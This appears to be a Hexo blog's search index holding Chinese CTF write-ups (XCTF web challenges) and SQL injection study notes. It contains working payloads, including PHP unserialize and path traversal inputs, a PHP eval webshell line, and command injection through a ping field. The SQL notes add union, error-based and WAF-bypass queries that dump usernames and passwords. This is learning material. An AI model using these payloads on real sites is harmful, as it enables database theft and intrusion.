{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Edmund0A","url":"https://Edmund0A.github.io","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"02-07","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-07","excerpt":""}],"posts":[{"title":"攻防世界web进阶篇（二）（Training-WWW-Robots）（※unserialize3）","text":"⚪Training-WWW-Robots这道题目属于考验对于robots协议掌握程度，它的解题难度并不高，只有简单几步。首先我们看题：很显然该题目的考点已经写在上面了，那么我们打开题目页面之后直接就去尝试查看robots协议：发现已经把flag的地址给出了。打开地址即可得到我们需要的flag：本题结束。 ⚪ ※ unserialize3（又是一道考验php语言功底的题目，我无了）首先看题目：“没有给出任何提示。。再打开题目页面：是一串php语言编码 （心里一凉） ，经过资料的查找，总算是大概搞懂了这几段代码里面重要元素的意思：首先，__wakeup这段 __wakeup经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 所以可以猜测被反序列化了但是可以看到这里没有特别对哪个字符串序列化，所以把xctf类实例化后，进行反序列化。利用php中的new运算符，实例化类xctf。【说人话的话意思就是：通过 _wakeup 这个代码可以看出来这段代码可以被反序列化漏洞作为突破点，而进行漏洞击破则需要我们绕过 _wakeup 这个函数以避免被exit掉。】而反序列化漏洞的原理是（以下引自大佬博客，这些以我的水平还无法触及orz） 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。我们在本地搭环境获得序列化的值 12345678910&lt;?php class xctf&#123;public $flag &#x3D; &#39;111&#39;;public function __wakeup()&#123;exit(&#39;bad requests&#39;);&#125;&#125;$x&#x3D;new xctf();echo serialize($x);?&gt; 获取的序列化值：O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;} 传入code参数后可获得flag。【yysy这题真的给我搞麻了，理解反序列化花了不少时间，因此打上了代表高难的“※”标】","path":"2020/10/04/攻防世界web进阶篇（二）（Training-WWW-Robots）（※unserialize3）/","date":"10-04","excerpt":"","tags":[]},{"title":"攻防世界web进阶篇（baby_web   warmup）","text":"🔺 前言在经过攻防世界新手篇web题目的洗礼后，深知了自己的无力，认识到学习web是一个任重而道远的过程，题目样式的多变性是其不变的特点，但是本人深知一句话，对于敢于挑战更难题目的人来说，未来的道路永远是为他而不断延伸的（意思就是，不要停下来刷题的脚步啊）。 ⚪ baby_web照常，我们首先审题。题目给的描述里有说“想想初始的页面是哪个”，那么该题目有可能是对于页面更改有关，我们来打开题目页面：有了题目给的提示，我们所要注意的点其实就只有地址栏一个地方了。我们发现转移到的地址并不是一般的地址，后面是跟着一个“1.php”的，也就是说这个并不是默认地址。那么就需要想个办法把默认地址搞出来，初步推测flag就在其中了。我们继续祭出老大哥 “burpsuite” （大哥今天我们去堵谁） ，来截取这个网站强行让他转移到初始网址。经过抓包后，发现了开头的异样： 好 家 伙 ！想不到这道题目浓眉大眼的居然还藏着这一手 ，发现原因后直接改成index.php来让他强行转到初始页面，在发送给Repeater并改正后，直接发送，这时候我们可以看到他隐藏的flag提示。yysy你就算说了Flag不在这里我也不会信 ，找到flag，得到答案，此题结束。 ⚪ ※warmup yysy这道题目让我感受到了深深的无力，毫不留情的解开我刷题不足的现实。。因为这道题考点很简单一点也不复杂，就只考验了php基本语言语法的用法，而我在这道题上面耗了老久（X_x）还是得继续努力啊 那么首先看题目， 好，打开题目网站，只见一张滑稽大脸糊过来，题目上也没有任何提示 （而如今一道这么简单的题目我浪费这么大力气。。我感觉这个滑稽就是在嘲讽我一样） ，那么就一如往常打开源码，发现源码中有一点提示：题目给了我们一个后缀&lt;!--source.php--&gt;，我们尝试在地址栏最后加入，可以发现网页发生了变化，出来了一串php语言文字： 解题的关键不出意外就在这些php语言编码之中 （我丢人的开始） ，先审计php代码，从前面几行我们可以看到 $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; ，可以得到另一个地址，在地址栏后面换成” /hint.php “后,转入的新页面： 都吼起来了，那么答案应该就藏在这一页的某处，需要我们自主去寻找了。我们继续看源码： 12345678910if (! empty($_REQUEST[&#39;file&#39;]) &#x2F;&#x2F;$_REQUEST[&#39;file&#39;] &#x2F;&#x2F;值非空&amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &#x2F;&#x2F;$_REQUEST[&#39;file&#39;]&#x2F;&#x2F;值为字符串 &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) &#x2F;&#x2F;能够通过checkFile函数校验) &#123;include $_REQUEST[&#39;file&#39;]; &#x2F;&#x2F;包含$_REQUEST[&#39;file&#39;]文件exit;&#125; else &#123;echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;; &#x2F;&#x2F;打印大号滑稽 &#125; 发现这段源码要求我们符合几个条件才能得到flag，即对于值的要求是：&lt;值为非空&gt;&lt;值为字符串&gt;&lt;能够通过checkFile()的检验&gt;。这之后我们再看checkfile()代码，可以发现其中包含着四个if语句。而其中各个if语句的含义是： 第一个if语句对变量进行检验，要求$page为字符串，否则返回false；第二个if语句判断 $page 是否存在于 $whitelist数组 中，存在则返回true；第三个if语句判断截取后的 $page 是否存在于 $whitelist数组 中，截取 $page 中“?”前部分，存在则返回true；第四个if语句判断url解码并截取后的 $page 是否存在于 $whitelist 中，存在则返回true。 若以上四个if语句均未返回值，则返回false；有三个if语句可以返回true，第二个语句直接判断 $page ，不可用；第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用；第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：http://399fe153-1f62-43d5-a67f-e645a0e7ac66.node3.buuoj.cn/source.php?file=source.php%253f../ffffllllaaaagggg经过测试发现无返回值，这可能是因为我们不知道ffffllllaaaagggg文件存放的具体位置，所以依次增加`../`,最终成功拿到flag。(这一段是参考别人博客整的，因为以个人水平实在有些难以理解，研究许久也只是一知半解，但大概得知了flag的获取方式)","path":"2020/09/30/攻防世界web进阶篇（baby_web   warmup）/","date":"09-30","excerpt":"","tags":[]},{"title":"攻防世界题目回顾（新手题目  下）","text":"🔺 题目及解题思路⚪ 第九题该题考研的是对于php语言的基本认知，以及对其算法运用的初步理解。首先进入题目网址，查看到题目页面。既然是php有关，那么就需要了解一下php语言的基本语法。该题目需要用到的基本语法以及个人见解整理如下： 123456789101112131415161718192021222324---------------------------------------------------------------------------------$a&#x3D;@$_GET[&#39;a&#39;];$b&#x3D;@$_GET[&#39;b&#39;];有点类似于C语言的赋值语句，经过百度查找后发现确实如此。在网页上get时只需在地址后面直接加“&#x2F;?a&#x3D;**&amp;b&#x3D;**”即可。---------------------------------------------------------------------------------if($a&#x3D;&#x3D;0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt;典型的if语句，和C语言的if语句非常相似。因此基本上可以看出大概什么意思，但在此处还是解释一下。第一个if：a&#x3D;&#x3D;0 and $a其中的php两个等号为宽松比较，三个等号为严格比较。举例说明：“0”&#x3D;0 在两个等号的情况下返回“true”，在三个等号的情况下返回“false”。综合来看，对于a的赋值必须保证第一位是字母，$a:a必定为真。echo：基本上与c语言中的“printf”同义；对于b的赋值必须保证不是纯数字，b要大于1234。当a和b同时满足条件时，会返回来flag。 即a和b的值中，如果a和0比较返回为true且a为真，且b是大于1234的纯数字，满足这两个数值的条件才会返回flag。因此可取a=abcd ，b=1235a。输入后可得到flag。 ⚪ 第十题观察题目，发现该题题目提到了的关键字包含有“xff”“refer”，而这两者便是解开该题目的关键。本题进入答题页面后发现要求ip地址必须为“123.123.123.123”； 这边要用到xff的相关知识，部分知识如下： 123456X-Forwarded-For (XFF) 在客户端访问服务器的过程中如果需要经过HTTP代理或者负载均衡服务器，可以被用来获取最初发起请求的客户端的IP地址，这个消息首部成为事实上的标准。在消息流从客户端流向服务器的过程中被拦截的情况下，服务器端的访问日志只能记录代理服务器或者负载均衡服务器的IP地址。如果想要获得最初发起请求的客户端的IP地址的话，那么 X-Forwarded-For 就派上了用场。这个消息首部会被用来进行调试和统计，以及生成基于位置的定制化内容，按照设计的目的，它会暴露一定的隐私和敏感信息，比如客户端的IP地址。所以在应用此消息首部的时候，需要将用户的隐私问题考虑在内。 了解这些之后，我们打开burpsuite，来进行对代理的拦截。拦截到后右击选择“发送给Repeater”进入重发器，通过直接在请求头添加X-Forwarded-For:123.123.123.123的方式来转到123.123.123.123的ip，随后放包：此时可见多处一行回显&lt;script&gt; ：必须来自 https://www.google.com*意思是需要请求头包含当前请求页面的来源页面的地址https://www.google.com也就是修改请求头中的Referer内容为https://www.google.com以下是相关refer的知识（转自大佬博客）： Referer请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。 需要注意的是 referer 实际上是 “referrer” 误拼写。参见 HTTP referer on Wikipedia （HTTPreferer 在维基百科上的条目）来获取更详细的信息。 在以下两种情况下，Referer 不会被发送： 来源页面采用的协议为表示本地文件的 “file” 或者 “data” URI；当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。 总而言之，意思就是将refer添加。在重发器中最后一行下面继续添加上Referer: https://www.google.com，之后点击发送： 就可以看到flag出现了。 ⚪ 第十一题来到第十题之后，首先审题，发现该题目是webshell有关题目，需要对于webshell的原理有所理解。进入答题网页，发现题目下方有一行代码&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;，经过查询得知，该代码是一个php后门程序，也就是人们常说的 “php木马” ，其含义是执行POST来的shell’参数语句。这边首先解释一下eval的含义和作用： 12&#96;&#x2F;&#x2F;eval&#96; — 把字符串作为PHP代码执行 &#96;eval(&#39;echo 123;&#39;);&#96;&#x2F;&#x2F;输出123 所有的字符串放入到eval当中，eval会把字符串解析为php代码来进行执行，那么结合$_POST[‘posha’]的话，只要使用post传输时在name为posha的值中写入任何字符串，都可以当做php代码来执行，这个时候就有点可怕了，比如写入一段循环删除整站代码等等。 —-摘自【百度百科】 理解了eval代码的作用之后，我们就会有一点头绪了。对于webshell来讲，我们可以使用常见的webshell工具中国菜刀，中国蚁剑这样的软件来进行解题。这边仅用中国蚁剑来进行演示解题。（中国菜刀太坑了 下载下来就显示有病毒，根本就不敢用。。就用蚁剑了，这边给一下蚁剑的下载地址中国蚁剑 提取码：1234） 打开中国蚁剑后，首先在空白处右键添加数据，将题目网址输入后创建，并右键选择“文件管理”来打开目录： 进入目录后便可以找到flag.txt文件，获取flag。 ⚪ 第十二题(yysy不要看到题目难度星级高就退缩，这题是个纸老虎)进入题目页面，查看题目涉及知识，经题目可知该题目主要涉及js的相关知识。进入答题页面，发现就要输入密码才可以继续前进：首先，打开网页源码，查看源码发现底部有一串申必数字：而根据所学知识可以发现，带有“/x”前缀的数字代表着该数字是16进制的意思。因此，我们将这串数字复制粘贴下来并将其十六进制转十进制，得到一串十进制数字结果：这串数字并不是毫无意义，而我们发现其中每过两三个数字就有一个44，于是推测该串十进制数字还可以根据ASCII码格式继续转换，于是我们对照ASCII码表继续进行转换，得到如下结果：得到如下结果后，如果继续进行转换，便可以直接得到flag。按照题目格式直接输入即可得到正确flag。至此， 攻防世界web篇新手题目到此结束， 🔺 总结攻防世界wed篇的新手题目做完后，给我的第一感觉就是题目类型的多样性，以及让我对于web题目难度有了一个全新的认识（当然也锻炼了我的审题能力），但是总的来说，web类的题目种类虽然繁杂多样，但是终究离不开那几个大规律：从源码找信息、疑似密码学的解题方式（？）、对于php语句等的认识……总体上找到窍门后便可以大大增加技术上的支持性，降低解题难度。但新手题目终究是新手题目，其中的题目难度还只是入门级，因此想要继续提升自己的web题目解题水平，还是要继续向着进阶难度的题目进行训练。","path":"2020/09/28/攻防世界题目回顾（新手题目  下）/","date":"09-28","excerpt":"","tags":[]},{"title":"攻防世界题目回顾（新手题目  中）","text":"🔺 题目及解题思路⚪ 第五题首先进行审题，发现这道题目与网页按钮配置有关。此题个人学习到的一共是有两种解题思路。 ▲ 第一种直接更改参数让按钮从无法点击的状态变成可以点击的状态。 查看网站源码来寻找网站按钮参数。发现按键的可使用权限是“disabled”状态。想要让他可以被按下，那么就把“disabled”去掉，让他变成可按下状态便可直接得到flag。 ▲ 第二种直通过查看源码得知返回某个值的时候可以得到flag。 查看源码内容得知，“value=”flag” name=”auth””，则可以向这个网站返回一个名为auth变量为flag的值：执行，便可得到flag。 ⚪ 第六题审题发现该题目是密码有关题目。首先打开答题网站，得知了该题目的基本形式，是一个包含有用户名和用户密码的登录框。这边随意输入一个用户名和密码试登录，意料之中的是网页返回了一个报错提示，提示了用户名应该为“admin”；利用admin作为用户名登陆后，跳到了check.php页面，而且这次返回了一个“error”报错。此时查看网页源码，还会发现一个提示“maybe you need a dictionary”，而恰好有个密码破解工具的一个数据包就被称作为“字典‘，就是burp suite。这个时候便可开始使用burp suite来进行密码拦截爆破。使用burpsuite的时候，从github上下载一个足够强大的字典，之后直接把截获下来的登陆数据返还给intruder来进行暴力破解。 最后返回的值中只有一个长度不一样，即为我们所需求的密码。（这边字典里直接就有密码123456） ⚪ 第七题这边看到第七题题目发现是有关cookie的内容，这边建议可以cookie quick manager插件来进行查看cookie。进入题目页面：打开cookie quick manager，直接查看这个网址的cookie数据，发现线索：“cookie.php”。将这个后缀直接加到网址后面可以进入一个新的页面获得一个新的提示。“see the http response”意思要看该网址返回来的数据是什么。因此直接F12调出源码查看，获得flag。 ⚪ 第九题这道题的题目是考验对于网址命令运用的熟悉程度，以ping为基础的知识是必备知识。进入所给网页后，发现给予了一个ping’指令框，因此尝试在其中填入本机地址和find指令寻找本机该地址所有的“.txt”后缀的文件中是否存在有flag（指令为 [本机地址] | find / -name “*.txt” ）。输入后可以发现一个名为“flag.txt”的文件，很明显flag就在其中，而我们所需要的就是打开这个文件来获取到flag。想要打开这个文件就需要用cat指令（指令为 [本机地址] | cat /home/flag.txt )，输入后即可得到flag。 🔺 5~8题结束。","path":"2020/09/21/攻防世界题目回顾（新手题目  中）/","date":"09-21","excerpt":"","tags":[]},{"title":"攻防世界题目回顾（新手题目  上）","text":"🔺一 前言由于一整个暑假的打工和学习驾驶考试的原因，对于web方面的学习有所欠缺，因此重新进行新型简单题目联系来试图回到之前的学习状态。最近在攻防世界开始自己的web学习，附带有个人思维向的解题思路和步骤。 🔺 二 题目及解题思路⚪ 第一题这道题还是很简单的，首先看题目审题。查看网页源代码，那就想都不想直接F12，发现flag在源码注释中。此题解出； ⚪ 第二题看题目，题目要求使用get方式提交一个名为a值为1的变量。提示就把解题方法写在上面了，那么照做就是答案。首先get一下a=1； 这时候会出来第二个提示，跟着提示祭出Hackbar，照做，此题得解。 ⚪ 第三题看到题目，我的第一想法就是先F12查看源码，然而出题者早已经有预料：既然这里没有那就换条思路，这道题题目中涉及到了robots协议，那就直接打开这个网站的robots文档：我一开始比较迟钝，感觉虽然出题人没有明写出来，但是说明了flag就在这里，就一直在源码里寻找注释，然而最后才注意到那个后缀，其实很简单，再把后缀加上去打开这个文件就可以得到flag。 ⚪ 第四题进入第四题之前需要明晰一点知识，就是常见的备份文件后缀名有“.git” 、“.svn”、“ .swp”、“.~”、“.bak”、“.bash_history”和“.bkf” 七种。其实知道上面的知识就已经得到答案了，直接加上备份后缀逐一查看他的备份文件，尝试出“index.php.bak”加上备份后缀后下载备份文件，其中便是flag。 🔺 前四题结束。","path":"2020/09/19/攻防世界题目回顾（新手题目  上）/","date":"09-19","excerpt":"","tags":[]},{"title":"联合查询注入 2","text":"🔺 常用语句▲ 判断有无注入点; and 1=1 and 1=2 ▲ 猜表一般的表的名称无非是admin adminuser user pass password 等.. 12and 0&lt;&gt;(select count(*) from *) and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表 ▲ 猜帐号数目 如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个 12and 0&lt;(select count(*) from admin) and 1&lt;(select count(*) from admin) ▲ 猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. 1234and 1=(select count(*) from admin where len(*)&gt;0)-- and 1=(select count(*) from admin where len(用户字段名称name)&gt;0) and 1=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;0)▲ 猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止 12345678and 1=(select count(*) from admin where len(*)&gt;0) and 1=(select count(*) from admin where len(name)&gt;6) 错误 and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6 and 1=(select count(*) from admin where len(name)=6) 正确and 1=(select count(*) from admin where len(password)&gt;11) 正确 and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12 and 1=(select count(*) from admin where len(password)=12) 正确▲ 猜解字 符 12and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位 and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位 就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 1and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) -- 这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符. 1234567891011group by users.id having 1=1-- group by users.id, users.username, users.password, users.privs having 1=1-- ; insert into users values( 666, attacker, foobar, 0xffff )--UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNSWHERE TABLE_blank&gt;_NAME=logintable- UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNSWHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id)- UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNSWHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank&gt;_id,login_blank&gt;_name)- UNION SELECT TOP 1 login_blank&gt;_name FROM logintable- UNION SELECT TOP 1 password FROM logintable where login_blank&gt;_name=Rahul-- ▲ 看_blank&gt;服务器打的补丁=出错了打了SP4补丁 1and 1=(select @@VERSION)-- ▲ 看_blank&gt;数据库连接账号的权限，返回正常，证明是_blank&gt;服务器角色sysadmin权限。 1and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin))-- ▲ 判断连接_blank&gt;数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA） 123and sa=(SELECT System_blank&gt;_user)-- and user_blank&gt;_name()=dbo-- and 0&lt;&gt;(select user_blank&gt;_name()--","path":"2020/08/16/联合查询注入 2/","date":"08-16","excerpt":"","tags":[]},{"title":"sql注入基本笔记_1","text":"union 联合查询🔺查询当前数据库名报错的语法 1（如and1=2）+ union select 1,database() 🔺查询当前数据库版本 1union select 1,version() 🔺查询当前数据库 表名 1union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 🔺查询当前数据库所有表，并且拼接在一行显示 1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 🔺查询当前数据库users中表所有字段，并且拼接在一行显示 1union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 🔺查询当前数据库users中表username和password字段中的信息，并且拼接在一行显示 1union select 1,group_concat(username,0x3a,password),3 from users--+ 联合查询报错型注入🔺加单引号报错，然后在回显点显示当前数据库所有表，并且拼接在一行显示 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ 🔺爆字段 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+ 🔺爆值 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+ updatexml报错注入🔺爆数据库版本信息 1?id=1' anandd（双写and绕过waf） updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --+ 🔺链接用户 1?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) 🔺爆库 1updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1) 🔺爆表 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1 🔺爆字段 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1) 🔺爆字段内容 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)","path":"2020/08/08/sql注入基本笔记_1/","date":"08-08","excerpt":"","tags":[]},{"title":"SQL注入点的判断","text":"🔺⚪▲ 🔺 SQL注入点的判断⚪ 通常情况对于SQL注入点的基本判断通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：http://xxx.xxx.xxx/abcd.php?id=XX 对 Sql 注入的判断，主要有两个方面：1.该带参数的 Url 是否存在 Sql 注入？2.如果存在 Sql 注入，是属于哪种 Sql 注入？对于可能存在 Sql 注入攻击的 ASP/PHP/JSP 动态网页中，一个动态网页中可能只有一个参数，也可能有多个参数。可能是整型参数也可能是字符串型参数，如果带有参数的 动态网页且此网页访问了数据库，就有可能存在 Sql 注入。若没有进行过字符过滤，则发生SQL注入的可能性就很大。 ⚪ 判断是否存在注入漏洞▲ 单引号判断在参数后面加上单引号，如： 1http://xxx/abc.php?id=1' 此时如果页面返回有错误，则证明是有存在注入漏洞。因为无论字符型还是整型都会因为单引号个数不匹配而报错。也存在有未报错的情况，这种情况不代表不存在sql注入漏洞，有可能是页面对单引号做了过滤，这种情况下需要用其他方法语句注入。 ⚪ 判断注入漏洞类型通常的sql注入漏洞分为两种类型，即数字型和字符型 。所有的类型都是根据数据库本身表的类型所产生的，在创建表的时候其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但无论怎么分常用的查询数据类型总是以数字与字符来区分的，因此就会产生注入点为何种类型。 ▲ 数字型的判断当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下： select * from &lt;表名&gt; where id = x 这种类型可以使用经典的 and 1=1 和 and 1=2 来判断：※ Url 地址中输入 http://xxx/abc.php?id= x and 1=1 页面依旧运行正常，继续进行下一步；※ Url 地址中继续输入 http://xxx/abc.php?id= x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。原因如下：当输入 and 1=1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=1无语法错误且逻辑判断正确，返回正常；当输入 and 1=2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=2无语法错误，但是逻辑判断为假，则返回错误。假设如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况： 12select * from &lt;表名&gt; where id = 'x and 1=1'select * from &lt;表名&gt; where id = 'x and 1=2' 查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，不会出现以上结果，故假设不成立。 ▲ 字符型判断当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下： 1select * from &lt;表名&gt; where id = 'x' 这种类型我们同样可以使用 and &#39;1&#39;=&#39;1 和 and &#39;1&#39;=&#39;2来判断：Url 地址中输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 页面运行正常，继续进行下一步。Url 地址中继续输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2 页面运行错误，则说明此 Sql 注入为字符型注入。原因如下当输入 and ‘1’=’1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;1&#39;该语句语法正确，逻辑判断正确，返回正确。当输入 and ‘1’=’2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;2&#39;该语句语法正确，但逻辑判断错误，则返回正确。","path":"2020/08/01/SQL注入点的判断/","date":"08-01","excerpt":"","tags":[]},{"title":"SQL注入绕过","text":"🔺⚪▲ 🔺 关键字的绕过⚪ 过滤如对and进行过滤，可以尝试：▲ 对于and,or的绕过可以尝试一下&amp;&amp;,||,异或特殊符号注入▲ 使用注释符绕过，比如: /*!and*/ uni/**/on se/**/lect▲ 大小写绕过: ANd UniOn SeleCt▲ 双关键字绕过: ununionion seselectlect▲ 关键字替换（在关键字中间可插入将会被WAF过滤的字符） – 例如SELECT可插入变成a&lt;nd，一旦插入字符被过滤，&lt;它将作为and传递。空格代替：+ %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/ ⚪ 大小写混合如果正则表达式只针对小写或大写的关键字进行匹配处理，根据数据库以不区分大小写的方式处理SQL关键字的特性，改变大小写。 1https://mp.csdn.net/index.php?id=-15 uNIoN sELecT 1,2,3,4 ⚪ 替换关键字这种情况下大小写转化无法进行绕过而且正则表达式会替换或删除select、union这些关键字，可以先摸清楚后台的过滤机制，针对正则过滤进行利用，如果select、union这些关键字只匹配一次就可以利用双写关键字进行绕过。 1https://mp.csdn.net/index.php?id=-15 UNIunionON SELselectECT 1,2,3,4 ⚪ 使用编码▲ URL编码如在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29。普通的URL编码可能无法实现绕过，不过存在某种情况比如URL编码只进行了一次解码过滤，那么这时候就可以用两次URL编码进行绕过。 1未编码前：?id=-1' UNION SELECT 1,2,3,4 --+# 1一次编码后：?id=-1%27%20UNION%20SELECT%201,2,3,4%20--+# 1二次编码后：?id=-1%2527%2520UNION%2520SELECT%25201,2,3,4%2520--+# ▲ 十六进制编码对后台针对单引号或者关键字进行处理，就可以使用16进制，把 ‘glbimreb21’ 变为 0x676c62696d7265623231,就可不需要单引号包裹着变量进行简单的绕过了，在用 16进制进行绕过时，16进制前面要加0x。 1转换前：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema='glbimreb21' --+ 1转换后：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema=0x676c62696d7265623231--+ ▲ Unicode编码Unicode是一种行业标准，它可以用不同的字符编码表示，Unicode有标准编码和非标准编码。常用的几个符号的一些Unicode编码单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9举例： **?id=10%D6’%20AND%201=2%23 SELECT ‘Ä’=‘A’; #1** 两个示例中，前者利用双字节绕过，对单引号转义操作变成’，就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在Unicode编码种类繁多，基于黑名单的过滤器无法处理所有情况，从而实现绕过。","path":"2020/07/26/SQL注入绕过/","date":"07-26","excerpt":"","tags":[]},{"title":"SQL注入 - - -猜解实践","text":"🔺⚪▲ 🔺 SQL注入—猜解这里使用的是DVWA平台进行注入，具体DVWA安装及配置方法、配置中常见问题网址已给出，这里不再赘述。▲首先进入DVWA主页并登录，选择“SQL injection”：▲使用控制参数的方法，让网址返回我们需要的信息。首先输入“1”并查看回显：（URL中ID=1，说明php页面通过get方法传递参数）▲此时点击右下角”View Source”查看源代码：其中可见SQL查询代码：由此可见实际执行的sql语句是 1SELECT first_name, last_name FROM users WHERE user_id = '1'; ▲（此方法摘自大佬的博客）如果使用其他方法，在输入框输入 1’ order by 1#，实际sql语句便会更改为： 1SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1#`; 语句的意思是查询users表中user_id为1的数据并按第一字段排行。 ▲输入 1’ order by 1# 和 1’ order by 2# 时都返回正常：▲输入 1’ order by 3# 时，返回错误：由此可得users表中只有两个字段，数据为两列。继续使用联合查询获取信息。▲输入 1’ union select database(),user()# 开始查询，得到返回：从中我们可以得到一些信息—网站使用数据库为dvwa，执行查询的用户名额为root@localhost。▲输入 1’ union select version(),@@version_compile_os# 进行查询，再次得到返回信息：则可以知道当前数据库版本为 : 5.6.31-0ubuntu0.15.10.1.，当前操作系统为 : debian-linux-gnu。","path":"2020/07/19/SQL注入 - - -猜解实践/","date":"07-19","excerpt":"","tags":[]},{"title":"sql注入基础回头","text":"🔺⚪▲ 🔺sql注入的概念 sql注入是指应用对于使用者所输入的非法恶意语句的审查未经过判断或过滤不严，导致使用者刻意将恶意sql查询或添加语句输入参数中，通过欺骗数据库进行非授权的恶意查询，进行解析攻击。 🔺web三层架构的解析三层架构就是遵循符合“高内聚，低耦合”思想，将各个功能模块划分为表示层（UI）、业务逻辑层（BLL）和数据访问层（DAL）三层架构，各层之间采用接口相互访问，并通过对象模型的实体类作为数据传递的载体，不同的对象模型的实体类一般对应于数据库的不同表，实体类的属性与数据库表的字段名一致。（摘自百度百科词条） 🔺sql注入原理每当我们访问动态网页时, Web 服务器会向数据访问层发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。结合用户的输入数据动态构造 Sql 语句，如果用户输入的数据被构造成恶意 Sql 代码，Web 应用又未对动态构造的 Sql 语句使用的参数进行审查，则会造成恶意语句的渗透，便是sql注入的基本形式。 ⚪sql注入影响▲ 攻击者不经授权便可获取到用户数据，借此盗取用户隐私信息；▲ 若网站拥有写入权限，攻击者甚至可以写入木马，对网站造成极大损害；▲ 攻击者拥有对其网站数据库的修改权限，可以肆意更改数据库中的内容；▲ 